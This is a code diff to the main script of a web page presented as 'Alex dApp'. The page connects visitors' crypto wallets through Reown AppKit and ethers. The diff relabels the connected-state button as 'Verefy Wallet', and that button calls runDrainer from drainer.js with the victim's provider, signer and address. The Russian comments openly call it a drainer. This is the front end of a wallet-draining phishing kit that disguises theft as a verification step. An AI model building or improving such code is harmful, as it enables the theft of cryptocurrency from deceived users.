@@ -1,86 +1,103 @@
-// main.js
-import { createAppKit } from '@reown/appkit';
+import { createAppKit } from '@reown/appkit'
 import {
-  mainnet, polygon, bsc, avalanche,
-  arbitrum, optimism, linea, base
-} from '@reown/appkit/networks';
-import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
-import { ethers } from 'ethers';
-import { runDrainer } from './drainer.js';
+  mainnet,
+  polygon,
+  bsc,
+  avalanche,
+  arbitrum,
+  optimism,
+  linea,
+  base
+} from '@reown/appkit/networks'
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
+import { ethers } from 'ethers'
+import { runDrainer } from './drainer.js'
 
-const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
+// глобальное хранение адреса
+window.caipAddress = null
 
-const networks = [
-  mainnet, polygon, bsc, avalanche,
-  arbitrum, optimism, linea, base
-];
+const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
+const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
 
-const wagmiAdapter = new WagmiAdapter({
-  projectId,
-  networks,
-});
-
+const wagmiAdapter = new WagmiAdapter({ projectId, networks })
+const metadata = {
+  name: 'Alex dApp',
+  description: 'Connect your wallet',
+  url: 'http://localhost:5173',
+  icons: ['https://checkalex.xyz/icon.png']
+}
 const modal = createAppKit({
   adapters: [wagmiAdapter],
   networks,
-  metadata: {
-    name: 'Alex dApp',
-    description: 'Connect your wallet',
-    url: 'https://checkalex.xyz',
-    icons: ['https://checkalex.xyz/icon.png'],
-  },
+  metadata,
   projectId,
   features: {
     analytics: true,
+    email: false,
+    socials: false
   },
-});
+  allWallets: "SHOW"
+})
 
-let appProvider = null;
-let appSigner = null;
-let userAddress = null;
+const statusEl    = document.getElementById("status")
+const actionBtn   = document.getElementById("action-btn")
 
-// Подключение кошелька
-modal.on('connect', async ({ provider }) => {
-  try {
-    if (!provider) {
-      alert("Не удалось получить provider. Попробуйте использовать другой браузер или откройте сайт в мобильном кошельке.");
-      return;
-    }
-
-    appProvider = new ethers.providers.Web3Provider(provider, 'any');
-    appSigner = appProvider.getSigner();
-    userAddress = await appSigner.getAddress();
-
-    const statusEl = document.getElementById('status');
-    if (statusEl) {
-      statusEl.textContent = `Подключено: ${userAddress}`;
-    }
-
-  } catch (e) {
-    console.error('Ошибка при подключении:', e);
-    alert('Ошибка при подключении кошелька: ' + e.message);
+// обновляем UI: текст кнопки и статус
+function updateUI() {
+  if (window.caipAddress) {
+    actionBtn.innerText = "Verefy Wallet"
+  } else {
+    actionBtn.innerText = "Connect Wallet"
   }
-});
-
-// Открытие модального окна подключения
-const connectBtn = document.getElementById('open-connect-modal');
-if (connectBtn) {
-  connectBtn.addEventListener('click', () => modal.open());
 }
 
-// Запуск дрейнера
-const drainBtn = document.getElementById('drainer-btn');
-if (drainBtn) {
-  drainBtn.addEventListener('click', async () => {
-    if (!appSigner || !appProvider || !userAddress) {
-      return alert('Сначала подключите кошелёк!');
+// получает адрес из MetaMask и сохраняет его
+async function updateAddress() {
+  try {
+    const accounts = await window.ethereum.request({ method: 'eth_accounts' })
+    if (accounts.length > 0) {
+      window.caipAddress = accounts[0]
+      console.log("Кошелёк подключён:", window.caipAddress)
+    } else {
+      window.caipAddress = null
     }
+  } catch {
+    window.caipAddress = null
+  }
+  updateUI()
+}
 
+// при загрузке проверяем, нет ли уже подключённого кошелька
+updateAddress()
+
+// реагируем на переключение аккаунтов
+if (window.ethereum) {
+  window.ethereum.on("accountsChanged", updateAddress)
+}
+
+// единая логика кнопки
+actionBtn.addEventListener('click', async () => {
+  if (!window.caipAddress) {
+    // 1) открыть модалку
+    await modal.open()
+
+    // 2) опрашивать пока не подключат
+    const timer = setInterval(async () => {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' })
+      if (accounts.length > 0) {
+        clearInterval(timer)
+        await updateAddress()       // сохранит и обновит UI
+      }
+    }, 500)
+  } else {
+    // кнопка стала Drainer → запускаем его
     try {
-      await runDrainer(appProvider, appSigner, userAddress);
+      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
+      const signer   = provider.getSigner()
+      const address  = window.caipAddress
+      await runDrainer(provider, signer, address)
     } catch (e) {
-      console.error('Ошибка в Drainer:', e);
-      alert('Ошибка при выполнении Drainer: ' + e.message);
+      console.error("Ошибка в Drainer:", e)
     }
-  });
-}
+  }
+})
